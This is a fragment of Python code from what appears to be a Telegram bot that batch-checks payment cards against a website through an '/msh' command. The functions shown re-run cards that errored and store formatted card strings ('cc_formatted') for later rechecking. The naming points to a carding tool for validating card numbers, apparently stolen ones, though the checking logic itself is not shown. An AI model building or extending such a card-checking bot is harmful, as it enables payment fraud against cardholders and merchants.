    """
    Recheck all error cards from a completed session.
    
    Creates new session with only error cards and runs /msh again.
    """
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    
    error_cards = session.get('error_cards', [])
    if not error_cards:
        await bot.send_message(
            chat_id=user_obj.id,
            text="❌ No error cards to recheck.",
            parse_mode="HTML"
        )
        return
    
    # Create new session for rechecking
    recheck_session_id = f"{session_id}_recheck_{int(time.time())}"
    
    try:
        await handle_msh(
            bot=bot,
            user_obj=user_obj,
            cards_input=error_cards,  # List of cards that errored
            session_id=recheck_session_id,
            site_url=session.get('site_url'),
            is_group=False
        )
        
        await bot.send_message(
            chat_id=user_obj.id,
            text="🔄 Error cards have been rechecked. Check your DM for results.",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"[MSH] Error rechecking cards: {e}")
        await bot.send_message(
            chat_id=user_obj.id,
            text=f"❌ Error during recheck: {str(e)[:100]}",
            parse_mode="HTML"
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TRACK ERROR CARDS (Store for later recheck)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def store_error_card(session_id: str, cc_formatted: str) -> None:
    """Store error card in session for later recheck."""
    session = MSH_SESSIONS.get(session_id)
    if session:
        if 'error_cards' not in session:
            session['error_cards'] = []
        session['error_cards'].append(cc_formatted)

